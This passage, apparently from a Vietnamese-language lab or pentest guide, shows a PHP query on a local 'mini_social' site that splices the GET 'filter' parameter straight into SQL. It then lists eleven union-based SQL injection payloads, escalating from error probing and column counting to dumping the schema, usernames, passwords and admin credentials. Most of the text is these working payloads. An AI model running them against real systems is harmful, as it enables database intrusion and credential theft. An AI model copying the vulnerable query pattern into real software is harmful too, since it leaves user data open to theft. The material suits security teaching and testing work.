...
## ✅ **2. UNION-BASED SQLi - Filter Parameter (home.php line 114)**

### **Lỗ hổng:**
```php
$filter = $_GET['filter'];
$filterSql = "SELECT users.username AS name, posts.content AS details 
              FROM posts JOIN users ON posts.user_id = users.id 
              WHERE users.username LIKE '%" . $filter . "%' 
              OR DATE(posts.created_at) = '" . $filter . "'";
$filterRes = $config->query($filterSql);
```

**Kiểu:** Union-based SQLi

### **Cách test:**

#### **Test 1: Basic SQLi**
```
http://localhost/mini_social/home.php?filter='
```
**Kỳ vọng:** SQL error

#### **Test 2: Comment out rest**
```
http://localhost/mini_social/home.php?filter=admin'--
```

#### **Test 3: Determine columns**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT NULL,NULL--
```
**Có 2 cột** (name, details)

#### **Test 4: Check data types**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT 'a','b'--
```

#### **Test 5: Extract database**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT database(),'version'--
```

#### **Test 6: Extract all tables**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT table_name,table_schema FROM information_schema.tables--
```

#### **Test 7: Extract users table structure**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--
```

#### **Test 8: Extract all usernames**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT username,'password' FROM users--
```

#### **Test 9: Extract username & password**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT username,password FROM users--
```

#### **Test 10: Extract specific admin data**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT username,password FROM users WHERE role='admin'--
```

#### **Test 11: Concatenate multiple columns**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT CONCAT(id,':',username,':',email,':',role),password FROM users--
```
